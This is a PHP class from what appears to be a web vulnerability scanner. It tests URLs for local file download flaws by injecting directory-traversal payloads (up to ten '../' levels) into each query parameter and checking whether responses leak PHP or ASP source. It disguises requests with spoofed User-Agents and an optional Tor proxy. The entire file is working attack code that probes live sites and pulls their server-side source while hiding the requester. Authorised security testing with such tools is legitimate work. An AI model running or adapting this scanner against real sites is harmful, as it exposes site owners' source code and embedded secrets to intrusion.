<?php

namespace Aszone\Vulnerabilities;

use Aszone\FakeHeaders\FakeHeaders;
use GuzzleHttp\Client;

class LocalFileDownload implements VulnerabilityScanner
{
    private $errors = [];

    public function isVulnerable($target)
    {
        if ($this->isLfdPossible($target)) {
            return $this->verify($target);
        }

        return false;
    }

    public function isLfdPossible($target)
    {
        return (bool) preg_match("/\?|(.+?)\=/", $target);
    }

    protected function verify($target)
    {
        $urls = $this->generateUrls($target);

        $this->output("\n");

        foreach ($urls as $url) {
            $result = $this->attack($url);

            if ($result && $this->isApplicationFile($result)) {
                $this->output('Is Vull');

                return $url;
            }
        }

        return false;
    }

    protected function isApplicationFile($body)
    {
        return (bool) preg_match("/<%@|<%|<\?php|<\?=/", $body);
    }

    protected function attack($url)
    {
        $this->output('.');

        $header = new FakeHeaders();
        $client = new Client(['defaults' => [
           'headers' => ['User-Agent' => $header->getUserAgent()],
            'proxy' => $this->commandData['tor'],
            'timeout' => 30,
        ]]);

        try {
            return $client->get($url)->getBody()->getContents();
        } catch (\Exception $e) {
            $this->output('#');
        }

        return false;
    }

    public function generateUrls($target)
    {
        $this->output("\n".$target);

        $parts = parse_url($target);

        if (!isset($parts['path'])) {
            return [];
        }

        $ext = $this->getExtension($parts['path']);

        $urlsIndex = $this->generateUrlsByExploit($target, 'index.'.$ext);
        $urlsPath = $this->generateUrlsByExploit($target, $parts['path']);

        return array_merge($urlsPath, $urlsIndex);
    }

    public function generateUrlsByExploit($target, $exploit)
    {
        $explodeUrl = parse_url($target);
        $explodeQuery = explode('&', $explodeUrl['query']);

        foreach ($explodeQuery as $keyQuery => $query) {
            $explodeQueryEqual = explode('=', $query);
            $wordsValue[$explodeQueryEqual[0]] = '';

            if ($explodeQueryEqual[1]) {
                $wordsValue[$explodeQueryEqual[0]] = $explodeQueryEqual[1];
            }
        }

        foreach ($wordsValue as $keyValue => $value) {
            $urls[] = str_replace($keyValue.'='.$value, $keyValue.'=??????????', $target);
        }

        $urlFinal = [];

        foreach ($urls as $url) {
            $urlFinal[] = str_replace('??????????', $exploit, $url);

            $breakFolder = '../';

            for ($i = 1; $i <= 10; ++$i) {
                $urlFinal[] = str_replace('??????????', $breakFolder.$exploit, $url);
                $breakFolder .= '../';
            }
        }

        return $urlFinal;
    }

    protected function getExtension($path)
    {
        $isValidExt = preg_match("/\.(.*)/", $path, $matches);

        if ($isValidExt) {
            return $matches[1];
        }

        return false;
    }
}
